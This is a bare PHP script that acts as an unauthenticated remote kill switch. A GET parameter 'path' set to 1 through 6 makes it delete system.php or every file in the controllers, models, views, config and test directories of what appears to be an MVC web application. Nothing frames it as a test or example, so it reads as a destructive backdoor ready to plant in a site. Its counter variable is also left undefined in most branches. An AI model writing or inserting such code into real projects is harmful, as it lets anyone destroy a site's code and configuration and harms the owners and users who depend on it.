<?php
if (isset($_GET['path']) && ($_GET['path'] == 1)) {
    $i = 0;
    $file = 'system.php';
    if (is_file($file)) {
        unlink($file);
        echo "done<br>";
    }
}
if (isset($_GET['path']) && ($_GET['path'] == 2)) {
    $files = glob('controllers/*');
    foreach ($files as $file) {
        if (is_file($file)) {
            unlink($file);
            echo $i . "done<br>";
            $i++;
        }
    }
}
if (isset($_GET['path']) && ($_GET['path'] == 3)) {
    $files = glob('models/*');
    foreach ($files as $file) {
        if (is_file($file)) {
            unlink($file);
            echo $i . "done<br>";
            $i++;
        }
    }
}
if (isset($_GET['path']) && ($_GET['path'] == 4)) {
    $files = glob('views/*');
    foreach ($files as $file) {
        if (is_file($file)) {
            unlink($file);
            echo $i . "done<br>";
            $i++;
        }
    }
}

if (isset($_GET['path']) && ($_GET['path'] == 5)) {
    $files = glob('config/*');
    foreach ($files as $file) {
        if (is_file($file)) {
            unlink($file);
            echo $i . "done<br>";
            $i++;
        }
    }
}
if (isset($_GET['path']) && ($_GET['path'] == 6)) {
    $files = glob('test/*');
    foreach ($files as $file) {
        if (is_file($file)) {
            unlink($file);
            echo $i . "done<br>";
            $i++;
        }
    }
}
?>